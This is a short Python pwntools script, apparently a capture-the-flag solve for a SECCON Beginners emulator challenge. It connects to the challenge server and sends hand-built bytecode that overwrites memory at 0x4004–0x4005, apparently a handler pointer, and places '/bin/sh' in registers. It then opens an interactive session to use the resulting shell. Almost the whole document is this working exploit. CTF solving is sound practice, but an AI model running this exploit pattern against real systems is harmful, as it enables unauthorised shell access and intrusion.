from pwn import *
import os

path = os.getcwd() + '/solve.txt'

# p = process('chall')
p = remote('emulator.quals.beginners.seccon.jp', 4100)

payload = b''

payload += b'\x26\x40'      # H
payload += b'\x2e\x04'      # L
payload += b'\x36\xd0'   

payload += b'\x26\x40'      # H
payload += b'\x2e\x05'      # L
payload += b'\x36\x10'   

payload += b'\x3e\x2f'      # /
payload += b'\x06\x62'      # b
payload += b'\x0e\x69'      # i
payload += b'\x16\x6e'      # n
payload += b'\x1e\x2f'      # /
payload += b'\x26\x73'      # s
payload += b'\x2e\x68'      # h

payload += b'\x00'

payload += b'\xc9' 

# with open(path, mode='wb') as f:
#     f.write(payload)

p.send(payload)
p.interactive()
